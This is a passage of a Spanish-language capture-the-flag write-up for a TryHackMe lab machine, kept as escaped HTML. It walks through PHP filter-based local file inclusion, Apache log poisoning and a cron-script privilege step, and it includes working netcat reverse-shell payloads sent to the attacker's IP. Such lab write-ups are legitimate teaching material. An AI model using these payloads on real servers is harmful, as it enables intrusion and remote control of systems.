        Control is an illusion    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos un filtro de PHP para leer y codificar en base64 el archivo &lt;code&gt;test.php&lt;/code&gt; con lo que obtuvimos el codigo fuente codificado y al decodificarlo encontramos nuestra segunda flag. Vemos en el codigo que el parametro que se le pase a &lt;code&gt;view&lt;/code&gt; debe de tener el string &lt;code&gt;/var/www/html/development_testing&lt;/code&gt; y este no debe de contener &lt;code&gt;../..&lt;/code&gt; por lo que no podriamos leer algun archivo en otra direccion y es necesario buscar y realizar bypas a esta condicional. Para poder hacer un &lt;a href=&#34;https://security.stackexchange.com/a/240122&#34;&gt;&lt;strong&gt;&amp;ldquo;bypass&amp;rdquo;&lt;/strong&gt;&lt;/a&gt; a esta pequeña condicional se incluye la direccion &lt;code&gt;/var/www/html/development_testing&lt;/code&gt; dentro de un filtro lo cual nos permitiria leer cualquier archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;php://filter/convert.base64-encode/resource&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/www/html/development_testing/test.php
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;	
&amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/test.php?view=/var/www/html/development_testing/mrrobot.php&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;button &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;secret&amp;#34;&lt;/span&gt;&amp;gt;Here is a button&amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
&amp;lt;?php

//FLAG: thm&lt;span class=&#34;o&#34;&gt;{[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; containsStr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$substr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; strpos&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$substr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; !&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;isset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;view&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])){&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!containsStr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;../..&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; containsStr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/development_testing&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        	include &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;

	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Sorry, Thats not allowed&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;	
?&amp;gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El filtro quedaria de la siguiente forma &lt;code&gt;php://filter//var/www/html/development_testing/resource=/etc/passwd&lt;/code&gt; lo cual nos permite leer el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_183757.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos tambien leer nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_183913.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion de archivos pero no encontramos alguna contraseña, verificamos que tuvieramos acceso a los logs de acceso de apache (&lt;code&gt;/var/log/apache2/acess.log&lt;/code&gt;) logramos leer dicho archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;10.2.29.162 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;05/Feb/2021:08:07:19 +0530&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /robots.txt HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;455&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&amp;#34;&lt;/span&gt; 10.2.29.162 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;05/Feb/2021:08:07:22 +0530&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /test.php?view=/var/www/html/development_testing/../../../../../../log/apache2/access.log HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;559&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&amp;#34;&lt;/span&gt; 10.2.29.162 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;05/Feb/2021:08:07:38 +0530&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /test.php?view=/var/www/html/development_testing/..///////..////..//////..///////..////..///////var/log/apache2/access.log HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;606&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que tenemos acceso a este archivo podemos verificar que sea posible ejecutar codigo para ello realizamos una prueba con &lt;code&gt;phpinfo()&lt;/code&gt; enviandolo a travez de una solicitud GET, al revisar el archivo &lt;code&gt;access.log&lt;/code&gt; logramos ver que se ejecuto dicha funcion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/archangel$ nc mafialive.thm &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
GET /&amp;lt;?php phpinfo&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; ?&amp;gt;
HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad Request
Date: Fri, &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 00:54:45 GMT
Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Content-Length: &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;
Connection: close
Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;!DOCTYPE HTML PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Bad Request&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Your browser sent a request that this server could not understand.&amp;lt;br /&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;address&amp;gt;Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Server at localhost Port 80&amp;lt;/address&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_204200.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Sabiendo esto podemos realizar &lt;a href=&#34;https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&#34;&gt;&lt;strong&gt;Log Poisoning&lt;/strong&gt;&lt;/a&gt; enviando codigo php para ejecucion de comandos en una peticion GET y al realizar la lectura del log el codigo se ejecutaría. Existen varias formas de ejecutar comandos se muestra: &lt;a href=&#34;https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&#34;&gt;link&lt;/a&gt; se muestra &lt;code&gt;&amp;lt;?php system($_GET[&#39;cmd&#39;]); &amp;gt;&lt;/code&gt; aunque es necesario pasar el comando en el parametro &lt;code&gt;cmd&lt;/code&gt; al realizar la lectura. Al intentar con varias funciones solo una funcionó, &lt;code&gt;exec&lt;/code&gt; ya que las demás no dejaban que realizaramos la lectura del archivo &lt;code&gt;access.log&lt;/code&gt;. El codigo enviado fue el siguiente: &lt;code&gt;&amp;lt;?php exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1338 &amp;gt;/tmp/f&#39;) ?&amp;gt;&lt;/code&gt; con el cual logramos obtener una shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/archangel$ nc mafialive.thm &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
GET /&amp;lt;?php exec&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.2.29.162 1338 &amp;gt;/tmp/f&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ?&amp;gt;
HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad Request
Date: Fri, &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; Feb &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 02:53:46 GMT
Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Content-Length: &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;
Connection: close
Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;!DOCTYPE HTML PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Bad Request&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Your browser sent a request that this server could not understand.&amp;lt;br /&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;address&amp;gt;Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Server at localhost Port 80&amp;lt;/address&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_205822.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;archangel---user&#34;&gt;ARCHANGEL - USER&lt;/h1&gt;
&lt;p&gt;Realizamos una enumeracion en la maquina y encontramos en el archivo crontab un script el cual es ejecutado por &lt;code&gt;archangel&lt;/code&gt;, dicho archivo tiene permisos de escritura, lectura y ejecucion para todos los usuarios y se ejecuta cada minuto. Agregamos una shell inversa al script y logramos obtener una shell con este usuario y nuestra segunda flag &lt;code&gt;user2.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@ubuntu:/$ cat /etc/crontab
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# m h dom mon dow user	command&lt;/span&gt;
*/1 *   * * *   archangel /opt/helloworld.sh
&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; *	* * *	root    &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.hourly
&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 6	* * *	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.daily &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; 6	* * 7	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.weekly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; 6	&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; * *	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.monthly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
www-data@ubuntu:/$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hello world&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /opt/backupfiles/helloworld.txt
www-data@ubuntu:/$ ls -lah /opt/helloworld.sh
ls -lah /opt/helloworld.sh
-rwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; archangel archangel &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 10:35 /opt/helloworld.sh
www-data@ubuntu:/$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.2.29.162 1339 &amp;gt;/tmp/f&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /opt/helloworld.sh
&amp;lt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;nc 10.2.29.162 &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; &amp;gt;/tmp/f&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /opt/helloworld.sh
www-data@ubuntu:/$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_210747.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
